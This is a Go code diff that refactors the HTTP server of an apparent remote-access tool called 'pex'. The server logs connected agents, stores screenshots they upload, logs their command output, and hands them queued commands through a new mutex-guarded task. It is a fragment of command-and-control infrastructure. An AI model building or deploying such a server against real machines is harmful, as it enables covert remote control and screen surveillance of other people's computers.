@@ -13,9 +13,9 @@ import (
 	"github.com/hardal7/pex/internal/config"
 )
 
-func Serve(ch chan string) {
+func Serve() {
 	root := http.NewServeMux()
-	root.Handle("/", http.HandlerFunc(requestHandler(ch)))
+	root.Handle("/", http.HandlerFunc(requestHandler()))
 
 	slog.Info("Starting server on port: " + config.Port)
 	server := http.Server{
@@ -28,7 +28,7 @@ func Serve(ch chan string) {
 	}
 }
 
-func requestHandler(ch chan string) http.HandlerFunc {
+func requestHandler() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		slog.Info("Connected Agent: \n")
 		slog.Info("Address: " + r.RemoteAddr)
@@ -48,12 +48,23 @@ func requestHandler(ch chan string) http.HandlerFunc {
 			out, _ := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
 			defer out.Close()
 			png.Encode(out, image)
-		} else if string(response) == "" {
-			command := <-ch
-			slog.Info("Command requested: " + command)
-			w.Write([]byte(command))
-		} else {
+		} else if string(response) != "" {
 			slog.Info("Received response:\n" + string(response))
+		} else {
+			requestCommand(w)
 		}
 	}
+}
+
+func requestCommand(w http.ResponseWriter) {
+	mu.Lock()
+	if task.Command != "" {
+		w.Write([]byte(task.Command))
+		slog.Info("Command requested: " + task.Command)
+		task.Command = ""
+	} else {
+		w.Write([]byte(""))
+		slog.Info("Pinged agent")
+	}
+	mu.Unlock()
 }
